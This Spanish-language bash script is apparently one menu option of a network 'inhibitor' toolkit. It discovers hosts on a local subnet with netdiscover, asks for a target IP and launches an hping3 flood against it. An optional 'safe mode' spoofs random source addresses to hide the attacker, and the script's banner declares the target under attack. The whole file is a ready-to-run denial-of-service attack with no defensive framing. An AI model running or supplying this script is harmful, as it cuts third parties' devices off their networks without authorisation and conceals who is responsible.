#!bin/bash

source installer.sh

Title
echo "[4] Incomunicar a un Dispositivo/IP"
echo
read -p "[*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " opc1
echo
sudo netdiscover -r $opc1/24 -P
echo
read -p "[*] Pon la IP del Objetivo: " ip
read -p "[*] Modo Seguro? (y/n): " opc2
echo
if [ $opc2 = y ]
	then
		Title
		echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
		echo
		echo "========================================================================================="
		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
		echo "========================================================================================="
		echo
		sudo gnome-terminal -- sudo ping $ip
		sleep 2
		sudo hping3 --rand-source -V $ip --flood
	else
		Title
		echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
		echo
		echo "========================================================================================="
		echo "                      El Objetivo ($ip) esta siendo Atacado""                    |"
		echo "========================================================================================="
		echo
		sudo gnome-terminal -- sudo ping $ip
		sleep 2
		sudo hping3 -V $ip --flood
fi
sleep 1
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc3
	case $opc3 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac

